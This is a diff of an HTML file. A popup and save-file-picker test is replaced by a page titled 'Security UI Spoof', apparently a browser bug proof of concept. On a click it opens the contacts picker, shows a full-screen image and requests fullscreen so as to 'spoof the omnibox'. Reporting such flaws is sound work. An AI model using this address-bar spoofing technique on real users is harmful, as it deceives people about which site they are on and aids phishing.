@@ -1,54 +1,38 @@
 <!DOCTYPE html>
-<html>
-<head>
-  <meta charset="utf-8">
-  <title>Popup Window + SaveFilePicker Test</title>
-</head>
-<body>
-
-<h3>Popup Window → Save File Picker</h3>
-
-<button id="openPopup">Open Popup</button>
-
-<script>
-function go() {
-  console.log("User clicked button");
-
-  const popup = window.open(
-    "https://www.google.com",
-    "popupTest",
-    "width=500,height=400,left=200,top=200,resizable=yes,scrollbars=yes"
-  );
-
-  if (!popup) {
-    alert("Popup blocked");
-    return;
-  }
-
-  popup.blur();
-  window.focus();
-
-  setTimeout(async () => {
-    try {
-      await window.showSaveFilePicker({
-        suggestedName: "test.txt",
-        types: [{
-          description: "Text Files",
-          accept: { "text/plain": [".txt"] }
-        }]
-      });
-      console.log("Picker shown");
-    } catch (e) {
-      console.log("Picker canceled:", e);
-    }
-  }, 300);
-}
-
-// ⬇️ INI YANG PENTING
-document
-  .getElementById("openPopup")
-  .addEventListener("click", go);
-</script>
-
-</body>
+<html lang="en">
+    <head>
+        <title>Security UI Spoof</title>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>
+        <style>
+            body {
+                margin: 0;
+                padding: 0;
+            }         
+            #spoof {
+                width:  100%;
+                height: 100%;
+            }
+        </style>
+        <script>
+            onclick = async () => {
+                (async () => {
+                    await navigator.contacts.select(["name"], {});
+                })();
+                document.getElementById("spoof").style   = "display: block;";
+                document.getElementById("content").style = "display: none;";
+                document.documentElement.requestFullscreen();
+            }
+        </script>
+    </head>  
+    <body>
+        <img id="spoof" style="display: none;" src="spoof.png"></img>
+        <div id="content">
+            <br><br><br>
+            <center>
+                <h1>Click anywhere on the page to spoof the omnibox!</h1>
+            </center>
+        </div>
+    </body>
+  </body>
 </html>
